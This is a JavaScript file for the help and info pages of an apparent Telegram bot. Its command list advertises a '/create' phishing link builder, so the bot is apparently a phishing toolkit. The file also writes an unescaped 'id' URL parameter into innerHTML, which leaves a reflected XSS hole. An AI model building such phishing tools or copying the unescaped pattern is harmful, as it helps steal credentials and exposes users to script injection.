const urlParams = new URLSearchParams(window.location.search);
const general = urlParams.get('general');
const chatId = urlParams.get('id');
const resultDiv = document.getElementById('result');

if (general === 'mychatid') {
   document.title = "🔰My ChatId";
   document.getElementById("h1-text").textContent = "🔰My ChatId";
    resultDiv.innerHTML = `
        Your Chat ID is:<br>
         ID: ${chatId}<br>
    `;
   resultDiv.className = 'message success';
} else if (general === 'devinfo') {
   document.title = "🔥Developer Info";
   document.getElementById("h1-text").textContent = "🔥Developer Info";
    resultDiv.innerHTML = `
        Developer Info:<br><br>
        Name: Md. Fahim Sarker<br><br>
        YouTube Channels:<br>
        1. The Innovations of Fahim<br><br>
        <a style="color: #ffffff;" href="https://www.youtube.com/@TheInnovationsofFahim">@TheInnovationsofFahim</a><br>
    `;
   resultDiv.className = 'message success';
} else if (general === 'devyoutub') {
   document.title = "✨Developer YouTube";
   document.getElementById("h1-text").textContent = "✨Developer YouTube";
    resultDiv.innerHTML = `
        YouTube Channels:<br>
        1. The Innovations of Fahim<br><br>
        <a style="color: #ffffff;" href="https://www.youtube.com/@TheInnovationsofFahim">@TheInnovationsofFahim</a><br>
    `;
   resultDiv.className = 'message success';
} else if (general === 'help') {
   document.title = "🚨Help";
   document.getElementById("h1-text").textContent = "🚨Help";
    resultDiv.innerHTML = `
        Type the commands to use:<br><br>
        <a style="color: #007bff;">/start</a> - bot restarter.<br>
        <a style="color: #007bff;">/create</a> - Phishing link builder.<br>
        <a style="color: #007bff;">/help</a> - bot helper.<br>
        <a style="color: #007bff;">/botinfo</a> - bot info.<br>
        <a style="color: #007bff;">/developerinfo</a> - Developer info.<br>
        <a style="color: #007bff;">/developeryoutubechannels</a> - Developer YouTube channels.<br>
        <a style="color: #007bff;">/commandlist</a> - View all commands<br>
    `;
   resultDiv.className = 'message success';
} else if (general === 'commandlist') {
   document.title = "🔥Command List";
   document.getElementById("h1-text").textContent = "🔥Command List";
    resultDiv.innerHTML = `
        Available commands:<br><br>
        <a style="color: #007bff;">/start</a> - bot restarter.<br>
        <a style="color: #007bff;">/create</a> - Phishing link builder.<br>
        <a style="color: #007bff;">/help</a> - bot helper.<br>
        <a style="color: #007bff;">/botinfo</a> - bot info.<br>
        <a style="color: #007bff;">/developerinfo</a> - Developer info.<br>
        <a style="color: #007bff;">/developeryoutubechannels</a> - Developer YouTube channels.<br>
        <a style="color: #007bff;">/commandlist</a> - View all commands<br>
    `;
   resultDiv.className = 'message success';
} else if (general === 'botinfo') {
   document.title = "🎆Bot Info";
   document.getElementById("h1-text").textContent = "🎆Bot Info";
    resultDiv.innerHTML = `
        Hi, This Telegram bot is made by<br>
        Md. Fahim Sarker.<br>
        Type <a style="color: #007bff;">/help<a/> for more info.<br>
    `;
   resultDiv.className = 'message success';
}







function backtoindex() {
  window.history.back();
}